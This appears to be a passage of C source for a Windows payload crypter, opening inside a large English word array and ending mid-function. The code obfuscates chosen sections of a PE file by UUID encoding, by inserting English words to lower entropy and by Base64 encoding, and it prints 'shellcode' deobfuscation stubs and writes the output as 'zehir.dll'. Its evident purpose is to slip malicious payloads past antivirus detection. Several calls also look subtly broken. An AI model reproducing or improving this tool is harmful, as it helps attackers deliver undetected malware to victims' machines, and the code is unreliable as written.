"kadu", "kaes", "kafa", "kago", "kagu", "kaha", "kahu", "kaid", "kaif", "kaik",
"kail", "kain", "kayo", "kays", "kaka", "kaki", "kala", "kale", "kali", "kalo",
"kama", "kame", "kami", "kana", "kand", "kane", "kang", "kans", "kant", "kaon",
"kapa", "kaph", "kapp", "kari", "karl", "karn", "karo", "kart", "kasa", "kasm",
"kate", "kath", "katy", "kats", "kava", "kavi", "kazi", "kbar", "kbps", "kcal",
"keap", "keas", "keat", "keck", "keef", "keek", "keel", "keen", "keep", "kees",
"keet", "kefs", "kegs", "keid", "keir", "keys", "keld", "kele", "kelk", "kell",
"kelp", "kelt", "kemb", "kemp", "kend", "kenn", "keno", "kens", "kent", "kepi",
"keps", "kept", "kerb", "kerf", "kerl", "kern", "kero", "kers", "keta", "keto",
"ketu", "keup", "kexy", "khan", "khar", "khat", "khet", "khir", "khis", "khot",
"khud", "kyah", "kyak", "kyar", "kyat", "kibe", "kiby", "kick", "kids", "kief",
"kiel", "kier", "kiev", "kifs", "kiho", "kiyi", "kike", "kyke", "kiki", "kiku",
"kyle", "kill", "kiln", "kilo", "kylo", "kilp", "kilt", "kina", "kind", "kine",
"king", "kink", "kino", "kins", "kipe", "kips", "kiri", "kirk", "kirn", "kish",
"kiss", "kist", "kite", "kyte", "kith", "kits", "kiva", "kivu", "kiwi", "klam",
"klan", "klip", "klom", "klop", "klva", "kmel", "kmet", "knab", "knag", "knap",
"knar", "knaw", "knee", "knet", "knew", "knez", "knit", "knob", "knop", "knot",
"know", "knox", "knub", "knur", "knut", "koae", "koan", "koas", "kobi", "kobu",
"koch", "koda", "koel", "koff", "koft", "kohl", "koil", "koko", "koku", "kola",
"koli", "kolo", "kome", "komi", "kona", "kong", "kook", "koph", "kopi", "kops",
"kora", "kore", "kori", "kory", "kors", "koso", "koss", "kota", "koto", "kozo",
"krag", "kral", "kran", "kras", "kris", "krna", "kroo", "ksar", "kuan", "kuar",
"kuba", "kudo", "kudu", "kueh", "kuei", "kues", "kuge", "kuki", "kuku", "kula",
"kuli", "kulm", "kung", "kunk", "kurd", "kuri", "kurn", "kurt", "kuru", "kusa",
"kvah", "kvar", "kvas", "kwan", "kwhr", "labs", "lace", "lacy", "lack", "lacs",
"lade", "lady", "lads", "laen", "laet", "laft", "lags", "laic", "laid", "laik",
"lain", "lair", "lays", "lait", "lake", "lakh", "laky", "lall", "lalo", "lama",
"lamb", "lame", "lamm", "lamp", "lams", "lana", "land", "lane", "lang", "lank",
"lant", "lanx", "laos", "lapb", "lapp", "laps", "lard", "lare", "lari", "lark",
"larn", "lars", "lasa", "lase", "lash", "lasi", "lask", "lass", "last", "lata",
"late", "lath", "lati", "lats", "laud", "laun", "laur", "laus", "lava", "lave",
"lavy", "lawk", "lawn", "laws", "laze", "lazy", "lead", "leaf", "leah", "leak",
"leal", "leam", "lean", "leap", "lear", "leas", "leat", "lech", "leck", "lect",
"leda", "lede", "leds", "leed", "leef", "leek", "leep", "leer", "lees", "leet",
"left", "lege", "legs", "lehi", "lehr", "leif", "leis", "leys", "leks", "leme",
"lena", "lend", "lene", "leng", "leno", "lens", "lent", "leon", "leos", "lepa",
"lere", "lerp", "lese", "less", "lest", "lete", "leto", "lets", "lett", "leud",
"leuk", "leva", "leve", "levi", "levy", "levo", "lewd", "lgth", "lyam", "liar",
"lias", "lyas", "libr", "libs", "lice", "lich", "lych", "lick", "lida", "lide",
"lido", "lids", "lied", "lief", "lien", "lier", "lies", "lyes", "lieu", "life",
"lifo", "lift", "lige", "liin", "lija", "like", "lila", "lile", "lily", "lill",
"lilt", "lima", "limb", "lime", "limy", "limn", "limo", "limp", "limu", "lina",
"lind", "line", "ling", "liny", "link", "linn", "lynn", "lino", "lins", "lint",
"lynx", "lion", "lyon", "lipa", "lips", "lira", "lyra", "lire", "lyre", "lisa",
"lise", "lyse", "lish", "lisk", "lisp", "liss", "list", "lite", "lith", "liti",
"lits", "litu", "litz", "live", "liza", "ller", "lleu", "llew", "llyn", "lndg",
"load", "loaf", "loam", "loan", "lobe", "lobi", "lobo", "lobs", "loca", "loch",
"loci", "lock", "locn", "loco", "lode", "loed", "loft", "loge", "logy", "logo",
"logs", "loyd", "loin", "loyn", "loir", "lois", "loka", "loke", "loki", "lola",
"loli", "loll", "lolo", "loma", "lond", "lone", "long", "lonk", "loob", "lood",
"loof", "look", "loom", "loon", "loop", "loos", "loot", "lope", "lops", "lora",
"lord", "lore", "lori", "lory", "lorn", "loro", "lors", "lose", "losh", "loss",
"lost", "lota", "lote", "loth", "loto", "lots", "loud", "louk", "loun", "loup",
"lour", "lout", "love", "lowa", "lowe", "lowy", "lown", "lows", "luau", "luba",
"lube", "luce", "lucy", "luck", "ludo", "lues", "luff", "luge", "lugs", "luis",
"luke", "lula", "lull", "lulu", "lump", "lums", "luna", "lune", "lung", "luny",
"lunk", "lunn", "lunt", "lupe", "lura", "lure", "lurg", "luri", "lurk", "lush",
"lusk", "lust", "lute", "luxe", "lvov", "lwop", "maad", "maam", "maar", "maat",
"maba", "mabi", "mace", "mach", "mack", "maco", "macs", "made", "madi", "mado",
"mads", "maed", "maes", "maga", "mage", "magh", "magi", "mags", "maha", "mahi",
"mahu", "maia", "maya", "maid", "mail", "maim", "main", "mayo", "mair", "mays",
"maja", "majo", "make", "maki", "mako", "maku", "mala", "male", "mali", "mall",
"malm", "malo", "malt", "mama", "mamo", "mana", "mand", "mane", "mang", "mani",
"many", "mank", "mann", "mano", "mans", "mant", "manx", "mapo", "maps", "mara",
"marc", "mare", "marg", "mari", "mary", "mark", "marl", "marm", "maro", "mars",
"mart", "maru", "marx", "masa", "masc", "mash", "mask", "mass", "mast", "masu",
"mate", "math", "maty", "mats", "matt", "maud", "maul", "maun", "maut", "maux",
"mawk", "mawn", "mawp", "maws", "maxi", "maza", "maze", "mazy", "mbps", "mdnt",
"mdse", "mead", "meak", "meal", "mean", "mear", "meas", "meat", "meaw", "mech",
"meck", "mede", "meed", "meek", "meer", "meet", "mein", "meio", "mela", "meld",
"mele", "mell", "mels", "melt", "memo", "mems", "mend", "mene", "meng", "meny",
"meno", "mens", "ment", "menu", "meow", "merc", "merd", "mere", "merk", "merl",
"mero", "merv", "mesa", "mese", "mesh", "meso", "mess", "mest", "meta", "mete",
"meth", "mets", "meum", "mewl", "mews", "mezo", "mgal", "mhos", "miae", "myal",
"mian", "miao", "mias", "mibs", "mica", "mice", "mick", "mico", "mide", "midi",
"midn", "mids", "miek", "myel", "mien", "miff", "migg", "migs", "mijl", "mike",
"miki", "mila", "mild", "mile", "milk", "mill", "milo", "mils", "milt", "mima",
"mime", "mimi", "mimp", "mina", "myna", "mind", "mine", "ming", "mini", "miny",
"mink", "mino", "mins", "mint", "minx", "mips", "mira", "myra", "mird", "mire",
"miri", "miry", "mirk", "miro", "mirs", "myrt", "mirv", "misc", "mise", "misy",
"miso", "miss", "mist", "myst", "mite", "myth", "mity", "mitt", "mitu", "myxa",
"mixe", "mixy", "myxo", "mixt", "mize", "mktg", "mmfd", "mmmm", "mnem", "moan",
"moas", "moat", "mobs", "moca", "mock", "moco", "mode", "modi", "mody", "modo",
"mods", "moed", "moet", "moff", "mogo", "mogs", "moha", "moho", "mohr", "moya",
"moid", "moil", "moyl", "moio", "moyo", "moir", "moit", "mojo", "moke", "moki",
"moky", "moko", "mola", "mold", "mole", "moly", "moll", "mols", "molt", "mome",
"momi", "momo", "moms", "mona", "mone", "mong", "mony", "monk", "mono", "mons",
"mont", "mood", "mool", "moon", "moop", "moor", "moos", "moot", "mope", "moph",
"mopy", "mops", "mora", "mord", "more", "morg", "morn", "moro", "mors", "mort",
"morw", "mose", "mosk", "moss", "most", "mota", "mote", "moth", "mots", "mott",
"moud", "moue", "moul", "moun", "moup", "mout", "move", "mowe", "mown", "mows",
"mowt", "moxa", "moxo", "moze", "mozo", "mpbs", "mrem", "msec", "mtge", "much",
"muck", "mudd", "muds", "muff", "muga", "mugg", "mugs", "muid", "muir", "mule",
"mulk", "mull", "mulm", "mult", "mume", "mumm", "mump", "mums", "mund", "mung",
"munj", "muns", "munt", "muon", "mura", "mure", "murk", "murr", "musa", "muse",
"mush", "musk", "muso", "muss", "must", "muta", "mute", "muth", "muts", "mutt",
"muzo", "muzz", "mzee", "naam", "nabk", "nabs", "nabu", "nace", "nach", "nada" };
void Sahiden_iyi_mi_geceler() {
    init();
    char* file_to_encrypt = NULL;
	
    /* This function ensures that the specified file exists. */
    while (check_file_existence(&file_to_encrypt, FILE_TO_ENCRYPT));

    HANDLE file_1 = openFile(file_to_encrypt); // file_1 icin suanlik isim bulamadim. Daha sonra tekrar bak.!

    printSectionsToScreen(findFile(file_1)->pe->sectionHeadersList, findFile(file_1)->pe->numberOfSections);
    
    int numberOfChoices_Section = getNumberSequence(&findFile(file_1)->sections_to_encrypt, SECT_TO_ENCRYPT, NULL), numberOfChoices_Encryption = 0;
    
    findFile(file_1)->numberOfSectionsToEncrypt = numberOfChoices_Section;

    for (int i = 0; i < numberOfChoices_Section; i++) numberOfChoices_Encryption = getNumberSequence(&(findFile(file_1)->pe->sectionsList[findFile(file_1)->sections_to_encrypt[i]]->encryption_methods),TYPE_OF_ENCRYPT, findFile(file_1)->pe->sectionsList[findFile(file_1)->sections_to_encrypt[i]]);

    encrypt_file(findFile(file_1));
}
void getInput(int state, void **stateVar, void* param3) {
    pFile f = fileList[0];

    switch (state)
    {
    case FILE_TO_ENCRYPT:
        if (*stateVar == NULL) *stateVar = malloc(MAX_PATH);
        printf("\n\n\nFilename:");
        scanf_s("%s", (char*)*stateVar, MAX_PATH);
        break;
    case SECT_TO_ENCRYPT:
        printf("\n\nWhich of these sections will be encrypted ? (e.g, 1,2,3):");
        scanf_s("%s", (char*)stateVar, 20);
        break;
    case TYPE_OF_ENCRYPT:
        printf(
            "\n0-) UUID_Obfuscation\n"
            "1-) Insert English Strings\n"
            "2-) Padding By Same Bytes\n"
            "3-) Base64 Encode\n\n"
            "Which ones of them for %s section to encrypt ? (e.g, 1,2,3):", ((PSECTION)param3)->name
        );
        scanf_s("%s", (char*)stateVar, 20);
    default:
        break;
    }
}
int check_file_existence(char **filename, int state) {
    BOOL retval = 0;

    while (1) {
        getInput(state, filename, NULL);

        if (state == CHECK_FILE)  retval = PathFileExistsA((char*)filename);
        else retval = PathFileExistsA(*filename);
         
        if (retval) return FALSE;
        else {
            int msgBoxId = MessageBox(
                NULL,
                (LPCWSTR)L"The file is not found!\nBe sure from if the file is exist",
                (LPCWSTR)L"File Error",
                MB_OKCANCEL | MB_ICONERROR
                );
            switch (msgBoxId){
                case IDOK: return TRUE;
                case IDCANCEL: exit(0);
            }
        }            
    }
}
HANDLE openFile(LPCSTR filename) {
    pFile file = (pFile)malloc(sizeof(File));
    file->pe = (PPE)malloc(sizeof(PE));
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_ALL,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("%s file is not opened.\n", filename);
        exit(1);
    }

    file->handle = hFile;
    DWORD sizeOfFileName = GetFinalPathNameByHandleA(hFile, Path, MAX_PATH, VOLUME_NAME_NONE | FILE_NAME_OPENED); // Null Terminated
    memcpy(file->filename, Path, MAX_PATH);
    file->size = GetFileSize(hFile, NULL);
    fill_PE_fields(file);
    fileList[numberOfFile] = file;

    numberOfFile++;

    return hFile;
}
void init() {
    fileList = malloc(sizeof(void*) * 2);

}
void fill_PE_fields(pFile file) {
    file->pe->imagebase = malloc(file->size);

    fResult = ReadFile(
        file->handle,
        file->pe->imagebase,
        file->size,
        NULL,
        NULL
    );

    if (!fResult)
    {
        printf("Reading %s file is failed\n", file->filename);
        CloseHandle(file->handle);
        return;
    }

    file->pe->dosHeader          = (PIMAGE_DOS_HEADER)file->pe->imagebase;
    file->pe->ntHeader           = (PIMAGE_NT_HEADERS)((byte*)file->pe->imagebase + file->pe->dosHeader->e_lfanew);
    file->pe->numberOfSections   = file->pe->ntHeader->FileHeader.NumberOfSections;
    file->pe->sectionHeadersList = malloc(sizeof(void**) * file->pe->numberOfSections);
    file->pe->sectionsList       = (PSECTION*)malloc(sizeof(void**) * file->pe->numberOfSections);
    //printf("Number of sections: %d\n", file->pe->numberOfSections);
    
    fillSectionHeadersList(file);
    fillSectionList(file);

    //dumpFeaturesOfSections(file->pe->sectionsList, file->pe->numberOfSections);
}
void fillSectionHeadersList(pFile file) {
    PIMAGE_SECTION_HEADER  sH = (PIMAGE_SECTION_HEADER)((byte*)file->pe->ntHeader + sizeof(IMAGE_NT_HEADERS));

    for (DWORD i = 0; i < file->pe->numberOfSections; i++) {
        *(file->pe->sectionHeadersList + i) = (PIMAGE_SECTION_HEADER)((byte*)sH + sizeof(IMAGE_SECTION_HEADER) * i);
    }
}
void fillSectionList(pFile file) {
    for (DWORD i = 0; i < file->pe->numberOfSections; i++) {
        PSECTION section = (PSECTION)malloc(sizeof(Section));
        memset(section, 0, sizeof(Section));
        
        memcpy(section->name, file->pe->sectionHeadersList[i]->Name, IMAGE_SIZEOF_SHORT_NAME);

        section->pointerToRawData = file->pe->sectionHeadersList[i]->PointerToRawData;
        section->SizeOfRawData    = file->pe->sectionHeadersList[i]->SizeOfRawData;
        section->sectionAddr      = file->pe->imagebase + section->pointerToRawData;
        section->RVA              = file->pe->sectionHeadersList[i]->VirtualAddress;
        section->sectionLastAddr  = section->sectionAddr + section->SizeOfRawData;
        file->pe->sectionsList[i] = section;
    }
}
void dumpFeaturesOfSections(PSECTION *sectionsList, int numberOfSections) {
    for (int i = 0; i < numberOfSections; i++) {
        PSECTION section = sectionsList[i];
        printf(
            "name: %s\t|\t"
            "Addr: %p\t|\t"
            "Last Addr: %p\t|\t"
            "Size: 0x%x\n", section->name, section->sectionAddr, section->sectionLastAddr, section->SizeOfRawData);
    }
}
void printSectionsToScreen(PIMAGE_SECTION_HEADER* sectionHeadersList, DWORD numberOfSections) {
    printf("\n\n");
    for (DWORD i = 0; i < numberOfSections; i++) {
        printf("%d-) %s\n", i, sectionHeadersList[i]->Name);
    }
}
pFile findFile(HANDLE hFile) {
    for (int i = 0; i < numberOfFile; i++) {
        if (hFile == fileList[i]->handle) {
            return fileList[i];
        }
    }
    return NULL;
}
int getNumberSequence(int** numberOfArray, int state, void* param3) {
    DWORD fark = 0;

    char str[20] = { 0 }, *next_token = NULL, *_str = str;

    int numberOfOptions = 1, * arr = NULL;

    getInput(state, (char**) & str, param3);

    char* token = strtok_s(str, ",", &next_token);

    while (token = strtok_s(NULL, ",", &next_token)) {
        numberOfOptions++;
    }

    if (param3 != NULL && state == TYPE_OF_ENCRYPT) ((PSECTION)param3)->numberOfencryptionMethods = numberOfOptions;

    *numberOfArray = (int*)malloc(sizeof(int) * numberOfOptions);
    memset(*numberOfArray, 0, sizeof(int) * numberOfOptions);

    arr = *numberOfArray;

    for (int i = 0; i < numberOfOptions; i++) {
        arr[i] = atoi(str + fark);
        _str = strchr(++_str, '\0');
        fark = _str - (byte*)str + 1;
    }

    return numberOfOptions;
}
void encrypt_file(pFile file) {
    char* base64_encoded_data = NULL, encodedfileName[MAX_PATH];

    for (DWORD i = 0; i < file->pe->numberOfSections; i++) {
        section = file->pe->sectionsList[i];
        rate = NULL;

        if (section->encryption_methods != NULL) {
            DWORD tmpsize = section->SizeOfRawData, numberOfOutBytes = 0;

            section->EncInfos = (pEncryptionInfo*)malloc(sizeof(pEncryptionInfo) * section->numberOfencryptionMethods);

            for (DWORD j = 0; j < section->numberOfencryptionMethods; j++) {
                pEncryptionInfo encInfo = malloc(sizeof(EncryptionInfo));

                switch (section->encryption_methods[j])
                {
                case 0:
                    UUID_Obfuscation(NULL, tmpsize, &numberOfOutBytes);

                    section->EncInfos[j] = encInfo;
                    section->EncInfos[j]->beforeSize = tmpsize;
                    section->EncInfos[j]->afterSize = numberOfOutBytes;

                    strcpy_s(encInfo->strVar, sizeof encInfo->strVar, "shellcode_UUID_Deobfuscated");

                    printf(
                            "\n\n*************************************************\n"
                            "*\tBefore Encryption %s Size: 0x%x\t*\n"
                            "*\tAfter  Encryption %s Size: 0x%x\t*\n"
                            "*************************************************\n\n",
                            section->name,
                            section->EncInfos[j]->beforeSize,
                            section->name,
                            section->EncInfos[j]->afterSize
                    );


                    tmpsize = numberOfOutBytes;

                    //printf("UUID\n");
                    break;
                case 1:
                    printf("\nHow frequently should you insert a pattern into the payload for %s section?\n", section->name);
                    printf("rate:");
                    scanf_s("%d", &rate);

                    decreaseEntropy(NULL, tmpsize, &numberOfOutBytes, rate);

                    section->EncInfos[j] = encInfo;
                    section->EncInfos[j]->beforeSize = tmpsize;
                    section->EncInfos[j]->afterSize = numberOfOutBytes;
                    section->EncInfos[j]->rate = rate;

                    strcpy_s(encInfo->strVar, sizeof encInfo->strVar, "shellcode_InsertEnglishWords_Deobfuscated");

                    printf(
                        "\n\n*************************************************\n"
                        "*\tBefore %s Section Size: 0x%x\t*\n"
                        "*\tAfter  %s Section Size: 0x%x\t*\n"
                        "*************************************************\n\n",
                        section->name,
                        section->EncInfos[j]->beforeSize,
                        section->name,
                        section->EncInfos[j]->afterSize
                        );

                    tmpsize = numberOfOutBytes;

                    //printf("Insert\n");
                    break;
                case 2:
                    section->EncInfos[j] = encInfo;
                    //printf("Padding\n");
                    break;
                default:
                    break;
                }
            }

            section->SizeOfRawDataAfterEnc = tmpsize;

            if (tmpsize > section->SizeOfRawData) {
                printf("Add the variable at below into %s section\n\n", section->name);

                print_var_to_add(tmpsize - section->SizeOfRawData);
            }
            printf("\n\n");

            for (int k = 0; k < section->numberOfencryptionMethods; k++) {
                if (section->encryption_methods[k] == 0 || section->encryption_methods[k] == 1) {
                    print_decryption_mechanism(section);

                    break;
                }
            }

        }
    }
    HANDLE file2 = check_file(file);

    for (int i = 0; i < file->numberOfSectionsToEncrypt; i++) {
        PSECTION section = file->pe->sectionsList[file->sections_to_encrypt[i]], section_ = NULL;
        char* payloadUUIDObfuscated = NULL, * payloadAddedEnglishStrings = NULL, * lastObfuscatedPayload = section->sectionAddr;
        int totalSize = section->SizeOfRawData, numberofoutbytes = 0;

        for (int j = 0; j < section->numberOfencryptionMethods; j++) {
            switch (section->encryption_methods[j])
            {
            case 0: // uuid
                lastObfuscatedPayload = UUID_Obfuscation(lastObfuscatedPayload, totalSize, &numberofoutbytes, 1);
                totalSize = numberofoutbytes;
                break;
            case 1: // english words
                lastObfuscatedPayload = decreaseEntropy(lastObfuscatedPayload, totalSize, &numberofoutbytes, section->EncInfos[j]->rate);
                totalSize = numberofoutbytes;
                break;
            case 2: // same byte
                fill_section_by_same_bytes(lastObfuscatedPayload);
                break;
            case 3:
                section_ = findFile(file2)->pe->sectionsList[file->sections_to_encrypt[i]];
                base64_encoded_data = base64_encode(section_->sectionAddr, section_->SizeOfRawData, &numberofoutbytes);

                char* strname = strchr(section->name, '.') + 1;

                sprintf_s(encodedfileName, sizeof encodedfileName, "encoded%ssection.txt", strname);

                FILE* file = NULL;

                fopen_s(&file, encodedfileName, "w");
                fwrite(base64_encoded_data, 1, numberofoutbytes, file);
                fclose(file);

                printf(
                    "*base64 encode Size: %d*\n"
                    "encoded%ssection.txt is created. You can upload it as public"
                    , numberofoutbytes, strname);

                break;
            default:
                break;
            }
        }
        
        PSECTION q = NULL;

        for (int i = 0; i < findFile(file2)->pe->numberOfSections; i++) {
            q = findFile(file2)->pe->sectionsList[i];

            if (strcmp(section->name, q->name) == 0)  break;
        }

        memcpy(q->sectionAddr, lastObfuscatedPayload, totalSize);
    }

    HANDLE hLastFile = CreateFileA(
        "zehir.dll",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hLastFile == INVALID_HANDLE_VALUE) {
        printf("%s file is not opened.\n", "zehir.dll");
        return 1;
    }

    DWORD bytesWritten;

    BOOL writeResult = WriteFile(
        hLastFile,
        findFile(file2)->pe->imagebase,
        findFile(file2)->size,
        &bytesWritten,
        NULL
    );

    if (!writeResult) {
        wprintf(L"Yazma hatasi\n");
        CloseHandle(hLastFile);
        return 1;
    }

    char newfilename[MAX_PATH];
    char* last;
    int fark;
    char lastFilename[] = "zehir.dll";

    char* tmpFile = file->filename;

    memcpy((char*)memcpy(newfilename, tmpFile, fark = ((last = strrchr(tmpFile, '\\') + 1) - tmpFile)) + fark, lastFilename, sizeof lastFilename);

    printf("%s was created.\n", newfilename);

}

HANDLE check_file(pFile file) {

    char filename[50], input[1];
    sprintf_s(filename, sizeof filename, "new_%s", basename(file->filename));

    printf("After applying these changes compile project again & put file called %s on the same location\n\n\n", filename);

    printf("If you have done, just enter:");

    int c;

    while ((c = getchar()) != '\n' && c != EOF);

    c = getchar();
    
    while (check_file_existence(&filename, CHECK_FILE));

    HANDLE file_2 = openFile(filename);

    pFile file2 = findFile(file_2);

    if (c = check_RVAs(file, file2)) {
        CloseHandle(file->handle);

        printf("\t- To continue, you must change RVA value of %s section.\n\t- Compile program again & save it as same filename(%s)\n\t- Or, your payload will not work correctly..:", file->pe->sectionsList[c]->name, basename(file->filename));
        scanf_s("%c", input, 1);

        
        HANDLE tmpfile = openFile(file->filename);

        for (int i = 0; i < file->pe->numberOfSections; i++) {
            memcpy(file->pe->sectionsList[i]->sectionAddr, findFile(tmpfile)->pe->sectionsList[i]->sectionAddr, file->pe->sectionsList[i]->SizeOfRawData);
        }
    }

    for (int i = 0; i < file->pe->numberOfSections; i++) {
        PSECTION section = file->pe->sectionsList[i], section_2 = NULL;
        if (section->encryption_methods != NULL) {
            for (int j = 0; j < file2->pe->numberOfSections; j++) {
                section_2 = file2->pe->sectionsList[j];
                if (strcmp(section->name, section_2->name) == 0 && section_2->SizeOfRawData >= section->SizeOfRawData) {
                    goto finish;
                    break;
                }
            }
        }
    }
finish:
    return file_2;
    //printSectionsToScreen(findFile(file_2)->pe->sectionHeadersList, findFile(file_2)->pe->numberOfSections);
}

void* my_memcpy(char* dest, const void* src, size_t n) {
    char* c_dest = (char*)dest;
    const char* c_src = (const char*)src;

    for (size_t i = 0; i < n; i++) {
        *c_dest++ = *c_src++;
    }

    return dest;
}

void print_var_to_add(int shellcodesize) {
    char prefix[] = "char* words2[] = { ", suffix[] = "};",
        word[20] = { 0 };

    int eklenecekkelimesayisi = (shellcodesize % 8 == 0) ? shellcodesize / 8 : shellcodesize / 8 + 1,
        bytesayisi = eklenecekbytesayisinibul(&words, eklenecekkelimesayisi),
        allsize = strlen(prefix) + bytesayisi + strlen(suffix) + 1/*for null byte*/ + eklenecekkelimesayisi * 2 /*for quotes*/ + (eklenecekkelimesayisi * 2 - 1) /*virgul icin*/;

    char* thebum = (char*)malloc(allsize + 1000), // If you got error, increase size or number of words!!
        * pstr = thebum;

    memset(thebum, 0, allsize + 1000);
    memcpy(thebum, prefix, strlen(prefix));

    pstr += strlen(prefix);

    for (int i = 0; i < eklenecekkelimesayisi; i++) {
        if (i % 10 == 0) {
            char c[] = "\n\t\t\t";
            memcpy(pstr, c, strlen(c));
            pstr += strlen(c);
        }

        if (i != eklenecekkelimesayisi - 1) {
            my_memcpy((char*)memcpy((char*)memcpy((char*)my_memcpy(word, "\"", 1, "\"", 1) + 1, words[i], strlen(words[i])) + strlen(words[i]), "\"", 1) + 1, ", ", 2);
            my_memcpy(pstr, word, 4 + strlen(words[i]));
            pstr += 4 + strlen(words[i]);
        }
        else {
            memcpy((char*)memcpy((char*)my_memcpy(word, "\"", 1, "\"", 1) + 1, words[i], strlen(words[i])) + strlen(words[i]), "\" ", 2);
            memcpy(pstr, word, 3 + strlen(words[i]));
            pstr += 3 + strlen(words[i]);

            memcpy(pstr, suffix, strlen(suffix));
        }

    }

    printf("%s\n", thebum);
}

void segment1(int* flowModifier, uint32_t** str, uint32_t** bytes, char* begStr, int payloadSize) {
    uint32_t result = 0;
    int bytesLeft = payloadSize - ((char*)*str - begStr);
    char* pr = NULL;
    char* ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint32_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint32_t));
        memset(pr, 0, sizeof(uint32_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }

    result |= (**str & 0x000000FF) << 24;
    result |= (**str & 0x0000FF00) << 8;
    result |= (**str & 0x00FF0000) >> 8;
    result |= (**str & 0xFF000000) >> 24;

    *str = ptr;
    **bytes = result;

    if (!(*flowModifier)) {
        (*bytes)++;
        (*str)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
    else {
        (*bytes)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
}

void segment2(int* flowModifier, uint16_t** str, uint16_t** bytes, char* begStr, int payloadSize) {
    uint16_t result = 0;

    int bytesLeft = payloadSize - ((char*)*str - begStr);
    char* pr = NULL;
    char* ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint16_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint16_t));
        memset(pr, 0, sizeof(uint16_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }

    result |= (**str & 0x00FF) << 8;
    result |= (**str & 0xFF00) >> 8;

    *str = ptr;
    **bytes = result;

    if (!(*flowModifier)) {
        (*bytes)++;
        (*str)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
    else {
        (*bytes)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
}

void segment3(int* flowModifier, uint16_t** str, uint16_t** bytes, char* begStr, int payloadSize) {
    uint16_t result = 0;

    int bytesLeft = payloadSize - ((char*)*str - begStr);
    char* pr = NULL;
    char* ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint16_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint16_t));
        memset(pr, 0, sizeof(uint16_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }

    result |= (**str & 0x00FF) << 8;
    result |= (**str & 0xFF00) >> 8;

    *str = ptr;
    **bytes = result;

    if (!(*flowModifier)) {
        (*bytes)++;
        (*str)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
    else {
        (*bytes)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
}

void segment4(int* flowModifier, uint16_t** str, uint16_t** bytes, char* begStr, int payloadSize) {
    int bytesLeft = payloadSize - ((char*)*str - begStr);
    char* pr = NULL;
    char* ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint16_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint16_t));
        memset(pr, 0, sizeof(uint16_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }
    **bytes = **str;

    *str = ptr;

    if (!(*flowModifier)) {
        (*bytes)++;
        (*str)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
    else {
        (*bytes)++;
        **(char**)bytes = '-';
        *bytes = (char*)*bytes + 1;
    }
}

void segment5(int* flowModifier, uint96_t** str, uint96_t** bytes, char* begStr, int payloadSize) {
    int bytesLeft = payloadSize - ((char*)*str - begStr);
    char* pr = NULL;
    char* ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint64_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint64_t));
        memset(pr, 0, sizeof(uint64_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }
    **(uint64_t**)bytes = **(uint64_t**)str;

    *str = ptr;

    if (!(*flowModifier)) {
        ((uint64_t**)(*bytes))++;
        ((uint64_t**)(*str))++;
    }
    else {
        ((uint64_t**)(*bytes))++;
    }

    bytesLeft = payloadSize - ((char*)*str - begStr);

    ptr = *str;

    if (*flowModifier) {
        return;
    }
    else if (sizeof(uint32_t) >= bytesLeft) {
        *flowModifier = 1;
        pr = malloc(sizeof(uint32_t));
        memset(pr, 0, sizeof(uint32_t));
        memcpy(pr, *str, bytesLeft);
        *str = pr;
    }

    **(uint32_t**)bytes = **(uint32_t**)str;
    *str = ptr;

    if (!(*flowModifier)) {
        *bytes = (char*)*bytes + sizeof(int);
        *str = (char*)*str + sizeof(int);
    }
    else {
        *bytes = (char*)*bytes + sizeof(int);
    }
}

char* UUID_Obfuscation(char* str, int PayloadSize, DWORD* numberOfOutBytes) {
    int flowModifier = 0, counter;
    int extendedPayloadSize = PayloadSize;
    if (extendedPayloadSize % 22 != 0) extendedPayloadSize < 22 ? extendedPayloadSize = 22 : (extendedPayloadSize += (((extendedPayloadSize / 22) + 1) * 22) - extendedPayloadSize);
    if (PayloadSize % 22 != 0) PayloadSize <= 22 ? counter = 1 : (counter = PayloadSize / 22 + 1);
    else counter = PayloadSize / 22;

    int numberoftire = (extendedPayloadSize / 22) * 4;

    extendedPayloadSize += numberoftire;
    *numberOfOutBytes = extendedPayloadSize;

    if (str == NULL) return;

    char* pstr = (char*)malloc(extendedPayloadSize);
    char* temppstr = pstr;
    memset(pstr, 0, extendedPayloadSize);
    char* begStr = str;

    for (int i = 0; i < counter; i++) {
        segment1(&flowModifier, &str, &temppstr, begStr, PayloadSize);
        segment2(&flowModifier, &str, &temppstr, begStr, PayloadSize);
        segment3(&flowModifier, &str, &temppstr, begStr, PayloadSize);
        segment4(&flowModifier, &str, &temppstr, begStr, PayloadSize);
        segment5(&flowModifier, &str, &temppstr, begStr, PayloadSize);
    }

    return pstr;
}

int eklenecekbytesayisinibul(char** words, int numberOfWord) {
    int eklenecekbytesayisi = 0;

    for (int i = 0; i < numberOfWord; i++) {
        //printf("%d\n", strlen(arr[i]));
